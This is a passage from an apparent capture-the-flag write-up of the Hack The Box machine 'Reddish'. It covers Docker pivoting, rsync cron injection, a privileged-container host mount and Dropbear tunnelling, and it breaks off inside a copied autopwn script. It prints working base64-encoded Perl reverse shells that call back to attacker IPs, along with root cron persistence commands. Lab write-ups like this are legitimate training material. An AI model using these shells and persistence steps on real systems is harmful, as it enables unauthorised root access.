<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rsync rsync://backup:873/src/etc/cron.d/</span></span><br><span class="line">drwxr-xr-x          4,096 2018/07/25 21:41:13 .</span><br><span class="line">-rw-r--r--            102 2015/06/11 10:23:47 .placeholder</span><br><span class="line">-rw-r--r--             29 2018/05/04 20:57:55 clean</span><br></pre></td></tr></table></figure>

<p>I’ll write a cron file. First, a shell script that calls back to www on port 9010:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjIwLjAuMiI7JHA9OTAxMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d &gt; shell.sh</span></span><br><span class="line"><span class="comment"># cat shell.sh</span></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;172.20.0.2&quot;;$p=9010;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"><span class="comment"># rsync -a shell.sh rsync://backup:873/src/tmp/</span></span><br><span class="line"><span class="comment"># rsync rsync://backup:873/src/tmp/</span></span><br><span class="line">drwxrwxrwt          4,096 2020/07/25 21:33:31 .</span><br><span class="line">-rw-r--r--              0 2020/07/25 21:24:23 luci</span><br><span class="line">-rw-r--r--            220 2020/07/25 21:33:08 shell.sh</span><br></pre></td></tr></table></figure>

<p>Now write the cron:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo &#x27;* * * * * root sh /tmp/shell.sh&#x27; &gt; shell</span></span><br><span class="line"><span class="comment"># rsync -a shell rsync://backup:873/src/etc/cron.d/</span></span><br></pre></td></tr></table></figure>

<p>Rather than tunnel everything thing back to kali, I’ll just use socat to listen on www in this case. That gets me a callback as root on backup:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /socat TCP-LISTEN:9010 STDOUT</span></span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># hostname</span></span><br><span class="line"><span class="string">backup</span></span><br></pre></td></tr></table></figure>

<h2 id="reddish-Host"><a href="#reddish-Host" class="headerlink" title="reddish Host"></a>reddish Host</h2><h3 id="File-System-Access"><a href="#File-System-Access" class="headerlink" title="File System Access"></a>File System Access</h3><p>backup is rather bare, other than the information I already had. However, one of the mis-configurations that can come with docker is running with –privileged. There’s some detail on slide 20 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvQm9yZ0hhbi9oYWNraW5nLWRvY2tlci10aGUtZWFzeS13YXk=">here<i class="fa fa-external-link-alt"></i></span>. That flag provides access to the raw devices in /dev on the host.</p>
<p>on backup, I see a lot more, including the disks:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ls /dev</span></span><br><span class="line">...</span><br><span class="line">psaux</span><br><span class="line">ptmx</span><br><span class="line">pts</span><br><span class="line">random</span><br><span class="line">rfkill</span><br><span class="line">rtc0</span><br><span class="line">sda</span><br><span class="line">sda1</span><br><span class="line">sda2</span><br><span class="line">sda3</span><br><span class="line">sda4</span><br><span class="line">sda5</span><br><span class="line">sg0</span><br><span class="line">sg1</span><br><span class="line">shm</span><br><span class="line">snapshot</span><br><span class="line">snd</span><br><span class="line">sr0</span><br><span class="line">stderr</span><br><span class="line">stdin</span><br><span class="line">stdout</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>This raw device access is enough to provide file system access:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mount /dev/sda1 /mnt</span></span><br><span class="line"><span class="comment"># ls /mnt/root</span></span><br><span class="line">root.txt</span><br></pre></td></tr></table></figure>

<p>grab the flag:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /mnt/root/root.txt</span></span><br><span class="line">50d0db644c8d5ff5312ef3d17c2ed205</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb56.jpg"></li>
</ul>
<h3 id="root-Shell"><a href="#root-Shell" class="headerlink" title="root Shell"></a>root Shell</h3><p>With write access to /etc/cron.d, I can get a root shell easily. And, reddish can talk directly home, so I don’t have to make tunnels, which is nice. Write a shell script:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuOSI7JHA9OTAxMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d &gt; shell.sh</span></span><br><span class="line"><span class="comment"># cat /mnt/opt/shell.sh</span></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.10.14.9&quot;;$p=9010;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Now write the cron:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /mnt/etc/cron.d/</span></span><br><span class="line"><span class="comment"># echo &#x27;* * * * * root sh /opt/shell.sh&#x27; &gt; shell</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">mdadm</span><br><span class="line">popularity-contest</span><br><span class="line">shell</span><br></pre></td></tr></table></figure>

<p>Catch the callback:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9010</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9010</span><br><span class="line">Ncat: Listening on 0.0.0.0:9010</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:35526.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">root.txt</span></span><br><span class="line"><span class="string"># ifconfig</span></span><br><span class="line"><span class="string">/bin/sh: 4: ifconfig: not found</span></span><br><span class="line"><span class="string"># ip addr</span></span><br><span class="line"><span class="string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span></span><br><span class="line"><span class="string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span></span><br><span class="line"><span class="string">    inet 127.0.0.1/8 scope host lo</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span></span><br><span class="line"><span class="string">    link/ether 00:50:56:b9:ef:a7 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 10.10.10.94/24 brd 10.10.10.255 scope global ens33</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">3: br-81dc9e600be9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:fe:5f:02:1f brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-81dc9e600be9</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">4: br-91c5803ee070: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:7e:9a:4c:f3 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.20.0.1/16 brd 172.20.255.255 scope global br-91c5803ee070</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">5: br-d4a52cd704d0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:71:03:1d:13 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-d4a52cd704d0</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">6: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:47:f2:fd:fd brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">8: vethff25d9b@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-d4a52cd704d0 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 5e:d0:0b:6f:0d:6f brd ff:ff:ff:ff:ff:ff link-netnsid 3</span></span><br><span class="line"><span class="string">10: veth2f1092e@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-81dc9e600be9 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 6a:7e:bc:f7:0d:2e brd ff:ff:ff:ff:ff:ff link-netnsid 3</span></span><br><span class="line"><span class="string">12: veth4ff04ec@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-d4a52cd704d0 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 32:d6:19:ae:75:e5 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span></span><br><span class="line"><span class="string">14: veth2349c18@if13: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-91c5803ee070 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 06:9f:60:e4:c1:cd brd ff:ff:ff:ff:ff:ff link-netnsid 0</span></span><br><span class="line"><span class="string">16: veth3bff539@if15: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-91c5803ee070 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 9a:c4:04:69:cd:5a brd ff:ff:ff:ff:ff:ff link-netnsid 2</span></span><br><span class="line"><span class="string">18: veth01eea77@if17: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-d4a52cd704d0 state UP group default </span></span><br><span class="line"><span class="string">    link/ether d2:d8:e2:80:45:09 brd ff:ff:ff:ff:ff:ff link-netnsid 1</span></span><br><span class="line"><span class="string">19: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000</span></span><br><span class="line"><span class="string">    link/ether 52:54:00:a8:fd:d5 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">20: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000</span></span><br><span class="line"><span class="string">    link/ether 52:54:00:a8:fd:d5 brd ff:ff:ff:ff:ff:ff</span></span><br></pre></td></tr></table></figure>

<p>what a great and complicated box!</p>
<h2 id="Beyond-Root"><a href="#Beyond-Root" class="headerlink" title="Beyond Root"></a>Beyond Root</h2><h3 id="Docker-Configuration"><a href="#Docker-Configuration" class="headerlink" title="Docker Configuration"></a>Docker Configuration</h3><p>Once I have root, I like to go back and look at how things were configured. In this case, the docker configuration is interesting.</p>
<p>The docker configuration files are stored in /opt/reddish_composition/:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /opt/reddish_composition/</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">apache</span><br><span class="line">docker-compose.yml</span><br><span class="line">multi-nodered</span><br><span class="line">redis</span><br><span class="line">rsync</span><br><span class="line">www</span><br></pre></td></tr></table></figure>

<p>docker-compose.yml shows how the machines are run, including the shared volume between redis and www, how the networks are laid out, and that backup is running in privileged mode (&lt;– comments added by me):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat docker-compose.yml</span></span><br><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  nodered:</span><br><span class="line">    build: ./multi-nodered</span><br><span class="line">    hostname: nodered</span><br><span class="line">    ports:</span><br><span class="line">     - <span class="string">&quot;1880:1880&quot;</span></span><br><span class="line">    networks:</span><br><span class="line">      - default</span><br><span class="line">      - internal-network</span><br><span class="line">    restart: always</span><br><span class="line">  redis:</span><br><span class="line">    build: ./redis</span><br><span class="line">    hostname: redis</span><br><span class="line">    volumes:</span><br><span class="line">     - ./www:/var/www/html</span><br><span class="line">    networks:</span><br><span class="line">     - internal-network</span><br><span class="line">    restart: always</span><br><span class="line">  www:</span><br><span class="line">    build: ./apache</span><br><span class="line">    hostname: www</span><br><span class="line">    volumes:</span><br><span class="line">     - ./www:/var/www/html</span><br><span class="line">     - /home:/home</span><br><span class="line">    networks:</span><br><span class="line">     - internal-network</span><br><span class="line">     - internal-network-2</span><br><span class="line">    restart: always</span><br><span class="line">  backup:</span><br><span class="line">    build: ./rsync</span><br><span class="line">    hostname: backup</span><br><span class="line">    volumes:</span><br><span class="line">     - ./rsync/www:/backup</span><br><span class="line">    networks:</span><br><span class="line">     - internal-network-2</span><br><span class="line">    restart: always</span><br><span class="line">    privileged: <span class="literal">true</span></span><br><span class="line">networks:</span><br><span class="line">  internal-network:</span><br><span class="line">   internal: <span class="literal">true</span></span><br><span class="line">  internal-network-2:</span><br><span class="line">   internal: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>update picture of the docker network one last time:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb57.jpg"></li>
</ul>
<h3 id="Node-Red-Collisions"><a href="#Node-Red-Collisions" class="headerlink" title="Node-Red Collisions"></a>Node-Red Collisions</h3><p>When I first visit the node red site, what’s to keep me from running into other people and their flows? And, what was with the need to issue a POST request to get the url to the site? Turns out, those are related.</p>
<p>The code that’s running the NodeRed instance is in /node-red/multinodered.js:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /opt/reddish_composition/multi-nodered/nodered/multinodered.js</span></span><br><span class="line">var http = require(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line">var express = require(<span class="string">&quot;express&quot;</span>);</span><br><span class="line">var crypto = require(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line">var id_list = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> createNodeREDInstance(server, app, ip) &#123;</span><br><span class="line"></span><br><span class="line">    var id = crypto.createHash(<span class="string">&#x27;md5&#x27;</span>).update(ip).digest(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id_list.indexOf(id) &gt; -1) &#123;</span><br><span class="line">        console.log(<span class="string">&quot;Instance already running:&quot;</span>, id);</span><br><span class="line">        <span class="built_in">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var RED = require(<span class="string">&quot;./red/red.js&quot;</span>)();</span><br><span class="line">    //var id = crypto.randomBytes(16).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    console.log(<span class="string">&quot;Creating new instance:&quot;</span>, id);</span><br><span class="line"></span><br><span class="line">    // Create the settings object - see default settings.js file <span class="keyword">for</span> other options</span><br><span class="line">    var settings = &#123;</span><br><span class="line">        httpAdminRoot:<span class="string">&quot;/red/&quot;</span>+id,</span><br><span class="line">        httpNodeRoot: <span class="string">&quot;/api/&quot;</span>+id,</span><br><span class="line">        userDir:<span class="string">&quot;./home/&quot;</span>+id,</span><br><span class="line">        functionGlobalContext: &#123; &#125;    // enables global context</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    RED.init(server, settings);</span><br><span class="line"></span><br><span class="line">    // Serve the editor UI from /red</span><br><span class="line">    app.use(settings.httpAdminRoot, RED.httpAdmin);</span><br><span class="line"></span><br><span class="line">    // Serve the http nodes UI from /api</span><br><span class="line">    app.use(settings.httpNodeRoot, RED.httpNode);</span><br><span class="line"></span><br><span class="line">    RED.start();</span><br><span class="line"></span><br><span class="line">    id_list.push(id);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Create an Express app</span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">// Add a simple route <span class="keyword">for</span> static content served from <span class="string">&#x27;public&#x27;</span></span><br><span class="line">app.use(<span class="string">&quot;/&quot;</span>,express.static(<span class="string">&quot;public&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(req,res) &#123;</span><br><span class="line">    var ip = (req.headers[<span class="string">&#x27;x-forwarded-for&#x27;</span>] ||</span><br><span class="line">     req.connection.remoteAddress ||</span><br><span class="line">     req.socket.remoteAddress ||</span><br><span class="line">     req.connection.socket.remoteAddress).split(<span class="string">&quot;,&quot;</span>)[0];</span><br><span class="line"></span><br><span class="line">    var id = createNodeREDInstance(server, app, ip);</span><br><span class="line">    res.status(200).send(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;ip&quot;</span>: ip, <span class="string">&#x27;path&#x27;</span>: <span class="string">&quot;/red/&#123;id&#125;&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// Create a server</span><br><span class="line">var server = http.createServer(app);</span><br><span class="line"></span><br><span class="line">server.listen(1880);</span><br></pre></td></tr></table></figure>

<p>There’s no GET for this app, which explains the error. A POST will create a new NodeRed instance and return the id, and the id is what’s sent back to us.</p>
<p>Inside the createNodeREDInstance() function I see the id is just a hash of our ip (which works out really nice when multiple HTB players are trying to use this at the same time):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var id = crypto.createHash(<span class="string">&#x27;md5&#x27;</span>).update(ip).digest(<span class="string">&quot;hex&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Creating-Port-Forwards-with-Dropbear"><a href="#Creating-Port-Forwards-with-Dropbear" class="headerlink" title="Creating Port Forwards with Dropbear"></a>Creating Port Forwards with Dropbear</h2><h3 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h3><p>a dummy account on my kali box (named dummy). In /etc/passwd, the shell is set to /bin/false:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dummy:x:1001:1001::/home/dummy:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>That makes it much harder for someone who gets ahold of the key I’m about to create to do anything useful hacking into my host. If you try to ssh into box as dummy, it just closes:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali<span class="comment"># ssh dummy@localhost</span></span><br><span class="line">dummy@localhost<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux kali 4.18.0-kali3-amd64 #1 SMP Debian 4.18.20-2kali2 (2018-11-30) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Kali GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Thu Jan 17 06:28:18 2019 from 127.0.0.1</span></span><br><span class="line"><span class="string">Connection to localhost closed.</span></span><br></pre></td></tr></table></figure>

<p>use the -N flag to connect without a shell, and the -L, -R, -D flags to forward ports (check out <span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDE4LzA2LzEwL2ludHJvLXRvLXNzaC10dW5uZWxpbmcuaHRtbA==">Intro to SSH Tunneling<i class="fa fa-external-link-alt"></i></span> for more details).</p>
<h3 id="Build-Dropbear"><a href="#Build-Dropbear" class="headerlink" title="Build Dropbear"></a>Build Dropbear</h3><p><span class="exturl" data-url="aHR0cHM6Ly9tYXR0LnVjYy5hc24uYXUvZHJvcGJlYXIvZHJvcGJlYXIuaHRtbA==">Dropbear<i class="fa fa-external-link-alt"></i></span> is a statically compiled, relatively small ssh client that I will use to connect back to my kali box from nodered. I’ll grab the source from the website. I’ll copy the file to nodered using the file upload flow or the perl command to get a file over http:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># perl -e &#x27;use File::Fetch; my $url = &quot;http://10.10.14.9/dropbear-2018.76.tar.bz2&quot;; my $ff = File::Fetch-&gt;new(uri =&gt; $url); my $file = $ff-&gt;fetch() or die $ff-&gt;error;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">dropbear-2018.76.tar.bz2</span><br></pre></td></tr></table></figure>

<p>Open the archive with tar:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tar xjvf dropbear-2018.76.tar.bz2                                                      </span></span><br><span class="line">dropbear-2018.76/                                                                        </span><br><span class="line">dropbear-2018.76/termcodes.h                                                  </span><br><span class="line">dropbear-2018.76/dbmulti.c                                                                </span><br><span class="line">dropbear-2018.76/cli-runopts.c  </span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<p>Now compile the software (the container has gcc and the minimum libraries to build this):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd dropbear-2018.76/                     </span></span><br><span class="line"><span class="comment"># ./configure &amp;&amp; make                  </span></span><br><span class="line">checking <span class="keyword">for</span> gcc... gcc                      </span><br><span class="line">checking whether the C compiler works... yes</span><br><span class="line">checking <span class="keyword">for</span> C compiler default output file name... a.out</span><br><span class="line">checking <span class="keyword">for</span> suffix of executables...    </span><br><span class="line">checking whether we are cross compiling... no</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<h3 id="Generate-Key-Pair"><a href="#Generate-Key-Pair" class="headerlink" title="Generate Key Pair"></a>Generate Key Pair</h3><p>Next generate a key pair to use with dropbearkey. It’s a simple program with <span class="exturl" data-url="aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi84L2Ryb3BiZWFya2V5">only a few options<i class="fa fa-external-link-alt"></i></span>. use -t rsa to make an RSA keypair, and -f .k to name the key file .k:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./dropbearkey -t rsa -f .k</span></span><br><span class="line">Generating 2048 bit rsa key, this may take a <span class="keyword">while</span>...</span><br><span class="line">Public key portion is:</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCFI9K2O4PVLSLLIJw2ExqYHtPUQTrcn+GKR3BRaD8Th+5CYIPMRQF8MK29tlgjdZh5MSf5RB4tsm523hMp6879tvi0Bzc0afZ8FKfaVjTwWsG/cbNFZzi4W5PpwsLkh9vbBgXhbPfdmMdz2uLZrsmPKVKXXkg/URz9vhiQelJAL0PcysIBh3c9CkJfNzzNJ2DHxY/OugnhQlObmLfOzkucP2DtTAZjYYCpc8cByzKS7vgo8rZLscf7QrN3LLKr8SFmjSnEcqxvIC1cVOpRju3kmfJxNY4ebcod1DaQtRYXC+K2byNwf5y3z3ahhW8dWJVLEcPH0bueuRVnYk3wfrjx root@nodered</span><br><span class="line">Fingerprint: sha1!! 78:53:6e:77:d8:da:ef:43:a7:c8:97:de:3c:a0:c4:d4:80:7d:f3:ab</span><br></pre></td></tr></table></figure>

<p>Now put this public key into the authorized key file for dummy on my kali box. While this key is in that file, anyone who has the private key (.k) can ssh into my box, so I’ll want to leave this in place only long enough to get the tunnels set up.</p>
<h3 id="Create-Tunnel"><a href="#Create-Tunnel" class="headerlink" title="Create Tunnel"></a>Create Tunnel</h3><p>Now use DropBear’s dbclient to ssh back, creating a tunnel to access the web page on www:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./dbclient -i .k -f -N -R 8888:172.19.0.4:80 dummy@10.10.14.9</span></span><br></pre></td></tr></table></figure>

<p>The options used are:</p>
<ul>
<li>-i .k - Use the keyfile I generated earlier</li>
<li>-f - run ssh in the background</li>
<li>-N - Done request a shell or run and commands</li>
<li>-R 8888:172.19.0.4:80 - listen on port 8888 on my kali host, and forward and traffic to 172.19.0.4 port 80. It’s important to note that my dummy user doesn’t have the privilege necessary to listen on a low port, like 80.</li>
</ul>
<p>Now can access the website on www:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb58.jpg"></li>
</ul>
<h2 id="python-auto-pwn-script"><a href="#python-auto-pwn-script" class="headerlink" title="python auto-pwn script"></a>python auto-pwn script</h2><p>reference to <span class="exturl" data-url="aHR0cHM6Ly9hbGFtb3QuZ2l0aHViLmlvL3JlZGRpc2hfd3JpdGV1cC8=">this writeup link<i class="fa fa-external-link-alt"></i></span></p>
<p>awesome write up and python script, i Worship the author…</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsYW1vdC9jb2RlLXNuaXBwZXRzL2Jsb2IvbWFzdGVyL2hhY2tpbmcvSFRCL1JlZGRpc2gvYXV0b3B3bl9yZWRkaXNoLnB5">script in his github<i class="fa fa-external-link-alt"></i></span></p>
<p>autopwnreddish.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># Author: Alamot</span></span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import uuid</span><br><span class="line">import fcntl</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">import random</span><br><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_ip_address(ifname):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    <span class="built_in">return</span> socket.inet_ntoa(fcntl.ioctl(</span><br><span class="line">        s.fileno(),</span><br><span class="line">        0x8915,  <span class="comment"># SIOCGIFADDR</span></span><br><span class="line">        struct.pack(<span class="string">&#x27;256s&#x27;</span>, ifname[:15].encode())</span><br><span class="line">    )[20:24])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">LHOST = get_ip_address(<span class="string">&#x27;tun0&#x27;</span>)</span><br><span class="line">LPORT1 = <span class="string">&quot;60000&quot;</span></span><br><span class="line">LPORT2 = str(random.randint(60003, 62535))</span><br><span class="line">LPORT3 = str(random.randint(62535, 65535))</span><br><span class="line">LPORT4 = <span class="string">&quot;60001&quot;</span></span><br><span class="line">UUIDNAME = str(uuid.uuid4())[:8]</span><br><span class="line">SOCAT_SRCPATH = <span class="string">&quot;socat&quot;</span></span><br><span class="line">SOCAT_DSTPATH = <span class="string">&quot;/var/tmp/socat&quot;</span> + UUIDNAME</span><br><span class="line">SUBASH_PATH = <span class="string">&quot;/var/tmp/&quot;</span> + UUIDNAME</span><br><span class="line">CRONPL_PATH = <span class="string">&quot;/tmp/&quot;</span> + UUIDNAME</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_payloads():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Get id</span></span><br><span class="line">    p1 = log.progress(<span class="string">&quot;Getting our 